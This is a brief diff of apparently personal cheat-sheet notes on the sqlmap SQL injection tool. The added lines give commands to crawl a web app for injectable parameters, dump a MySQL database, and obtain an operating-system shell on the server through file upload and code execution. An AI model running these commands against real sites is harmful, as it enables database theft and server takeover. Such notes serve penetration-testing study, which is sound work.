@@ -1,4 +1,8 @@
  
  
  
- > sqlmap -u url --crawl=1        // finds vulnerable variables in a the whole WepApp 
+> sqlmap -u url --crawl=1        // finds vulnerable variables in a the whole WepApp looks for vulnerable 
+
+> sqlmap -u url --dbms=mysql --dump --threads=5 
+
+> sqlmap -u url --dbms=mysql --os-shell      // automaticel load a file to the server and provide automatic code execution ability 
